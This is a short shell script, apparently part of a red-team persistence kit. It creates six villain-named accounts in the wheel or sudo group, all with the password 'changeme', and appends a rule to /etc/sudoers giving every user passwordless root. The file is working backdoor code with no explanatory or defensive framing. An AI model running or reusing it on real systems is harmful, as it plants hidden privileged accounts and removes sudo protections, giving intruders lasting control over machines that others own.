users_add() {
    # Figure out if we have adduser or useradd
    if [ "`command -v useradd`" != "" ]; then
	    tool="useradd";
    elif [ "`command -v adduser`" != "" ]; then
	    tool="adduser -D";
    else
        LOG 2 '`useradd` or `adduser` not on the system. Exiting'
        return
    fi

    # Find the group to add them too
    group=`grep -oE "wheel|sudo" /etc/group`
    if [ "$group" != "" ]; then
        tool="$tool -G $group"
    fi

    # Add all the following users
    for user in "kong" "thanos" "deadpool" "bane" "vader" "yondu"; do
        QUIET $tool $user;
        s1=$?;
        # Set the password for the user
        echo "$user:changeme" | chpasswd 2>/dev/null >/dev/null;
        s2=$?;
        if [ "$s2$s1" != "00" ]; then
            fail="$fail $user";
        fi;
    done;
    if [ "$fail" != "" ]; then
        LOG 2 "Failed to add the following users: $fail";
    else
        LOG 0 "Added users"
    fi;


    # let every user sudo with no passwd
    echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers";
}


users() {
    users_add;
};
